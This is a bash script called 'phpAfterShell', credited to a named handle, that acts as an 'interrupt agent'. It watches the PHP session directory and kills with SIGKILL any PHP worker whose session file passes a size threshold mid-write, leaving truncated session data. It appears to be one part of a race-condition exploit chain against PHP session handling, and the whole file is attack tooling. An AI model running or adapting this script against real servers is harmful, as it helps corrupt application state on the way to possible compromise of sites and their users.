#!/bin/bash
# agent.sh — interrupt agent, kill worker PHP mid-write
# by Cotab1mzz
set -u

BANNER=$(cat <<'EOF'
  _          _         _   _           _ _
 | |__  _ __ | |__     / \ | |_ ___ _ _| | | ___
 | '_ \| '_ \| '_ \   / _ \| __/ _ \ '__| | |/ _ \
 | |_) | |_) | | | | / ___ \ ||  __/ |  | | |  __/
 |_.__/| .__/|_| |_|/_/   \_\__\___|_|  |_|_|\___|
       |_|
     phpAfterShell  ·  by Cotab1mzz  ·  interrupt agent
EOF
)
echo "$BANNER"

THRESHOLD="${SESSION_THRESHOLD:-150000}"
POLL="${POLL_INTERVAL:-0.002}"
SESS_DIR="/var/lib/php/sessions"

echo "[agent] start threshold=${THRESHOLD} poll=${POLL}"

kill_mid_write() {
  local f="$1"
  [ -f "$f" ] || return
  local sz
  sz=$(stat -c%s "$f" 2>/dev/null || echo 0)
  [ "$sz" -lt "$THRESHOLD" ] && return
  local pid
  pid=$(lsof -t "$f" 2>/dev/null | head -1)
  if [ -n "${pid:-}" ]; then
    kill -9 "$pid" 2>/dev/null && echo "[agent] KILLED pid=$pid size=$sz file=$f"
  fi
}

# pakai inotify kalau ada — jauh lebih presisi dari polling
if command -v inotifywait >/dev/null 2>&1; then
  echo "[agent] mode=inotify"
  inotifywait -m -e modify,create --format '%w%f' "$SESS_DIR" 2>/dev/null |
  while read -r f; do
    kill_mid_write "$f"
  done
else
  echo "[agent] mode=polling"
  while true; do
    for f in "$SESS_DIR"/sess_*; do
      kill_mid_write "$f"
    done
    sleep "$POLL"
  done
fi